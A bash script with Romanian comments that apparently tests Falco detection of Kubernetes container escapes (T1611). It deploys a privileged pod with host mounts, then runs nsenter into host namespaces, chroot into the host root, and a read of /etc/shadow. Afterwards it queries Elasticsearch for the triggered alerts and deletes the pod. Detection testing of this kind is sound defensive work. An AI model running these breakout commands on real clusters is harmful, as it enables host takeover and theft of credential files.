#!/bin/bash
# Scenariul 1 - Container Escape (T1611 - Escape to Host)
# 1. Deploy un pod cu primitive de escape (privileged, hostPID, hostPath /, socket containerd).
# 2-6: tehnici clasice de breakout din interiorul lui.

set -e

NS=attack-target
EPOD=escape-pod
source "$(dirname "$0")/../_env.sh"
HERE=$(dirname "$0")

echo "=================================================="
echo "Scenariul 1 - Container Escape"
echo "Start: $(date +%T)"
echo "=================================================="

START_TS=$(date -u +%Y-%m-%dT%H:%M:%S.000Z)
echo "[marker] Start UTC: $START_TS"
echo ""

# ---------------------------------------------------------------------------
# step 1/6 - Deploy pod cu primitive de escape [T1611]
# ---------------------------------------------------------------------------
echo "[step 1/6] kubectl apply escape-pod.yaml (privileged, hostPID, hostPath /, containerd.sock)"
kubectl apply -f "$HERE/escape-pod.yaml"
echo "  ... astept pod Ready (max 60s)"
kubectl wait --for=condition=Ready pod/$EPOD -n $NS --timeout=60s || kubectl get pod $EPOD -n $NS
echo ""
sleep 2

# ---------------------------------------------------------------------------
# step 2/6 - Acces /proc/sysrq-trigger (interfata kernel host, read-only - NU scriem!)
# ---------------------------------------------------------------------------
echo "[step 2/6] cat /proc/sysrq-trigger (open read-only - NU declanseaza nimic periculos)"
kubectl exec -n $NS $EPOD -- bash -c "head -c 0 /proc/sysrq-trigger 2>&1; echo 'opened /proc/sysrq-trigger (read-only)'"
echo ""
sleep 2

# ---------------------------------------------------------------------------
# step 3/6 - Acces socket-ul container runtime [T1611 - via mounted socket]
# ---------------------------------------------------------------------------
echo "[step 3/6] cat /run/containerd/containerd.sock (open socket runtime)"
kubectl exec -n $NS $EPOD -- bash -c "timeout 2 cat /run/containerd/containerd.sock 2>&1 | head -c 0; ls -la /run/containerd/containerd.sock; echo 'accessed containerd socket'"
echo ""
sleep 2

# ---------------------------------------------------------------------------
# step 4/6 - nsenter in namespace-urile host init (PID 1 vizibil via hostPID) [T1611]
# ---------------------------------------------------------------------------
echo "[step 4/6] nsenter -t 1 -m -u -i -n -p -- hostname (breakout in host namespaces)"
kubectl exec -n $NS $EPOD -- bash -c "nsenter -t 1 -m -u -i -n -p -- hostname 2>&1 || echo 'nsenter attempted (exit=$?)'"
echo ""
sleep 2

# ---------------------------------------------------------------------------
# step 5/6 - chroot in host root (montat la /host) + citire host /etc/shadow [T1611]
# ---------------------------------------------------------------------------
echo "[step 5/6] chroot /host /bin/sh -c 'id; head -1 /etc/shadow' (breakout via host root mount)"
kubectl exec -n $NS $EPOD -- bash -c "chroot /host /bin/sh -c 'id; head -1 /etc/shadow; cat /etc/hostname' 2>&1 || echo 'chroot attempted (exit=$?)'"
echo ""
sleep 2

# ---------------------------------------------------------------------------
# step 6/6 - unshare --mount (creare mount namespace nou - primitiva de escape) [T1611]
# ---------------------------------------------------------------------------
echo "[step 6/6] unshare --mount --fork bash -c 'echo unshared-mount-ns'"
kubectl exec -n $NS $EPOD -- bash -c "unshare --mount --fork bash -c 'echo unshared-mount-ns' 2>&1 || echo 'unshare attempted (exit=$?)'"
echo ""

echo "=================================================="
echo "Atac terminat. Astept 35s pentru propagare ES..."
echo "=================================================="
sleep 35

echo ""
echo "=== Reguli FALCO declansate de la $START_TS ==="
curl -s "$ES/security-*/_search?size=0" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"falco\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}},\"aggs\":{\"by_rule\":{\"terms\":{\"field\":\"rule.name\",\"size\":20}},\"by_priority\":{\"terms\":{\"field\":\"log.level\",\"size\":10}}}}" \
  | python3 -m json.tool | sed -n '/aggregations/,$p'

echo ""
echo "=== Sample 15 detectii (cronologic) ==="
curl -s "$ES/security-*/_search?size=15" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"falco\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}},\"sort\":[{\"@timestamp\":\"asc\"}],\"_source\":[\"@timestamp\",\"rule.name\",\"log.level\",\"output\"]}" \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
for h in d.get('hits',{}).get('hits',[]):
    s = h['_source']
    print(f\"  {s.get('@timestamp','?')[:19]} [{s.get('log',{}).get('level','?'):8}] {s.get('rule',{}).get('name','?')}\")
    out = s.get('output','')
    if out:
        print(f\"    -> {out[:200]}\")
"

echo ""
echo -n "Total Falco events: "
curl -s "$ES/security-*/_count" -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"falco\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}}}"
echo ""

echo ""
echo "=== Cleanup: kubectl delete pod escape-pod ==="
kubectl delete -f "$HERE/escape-pod.yaml" --wait=false 2>&1

echo ""
echo "End: $(date +%T)"
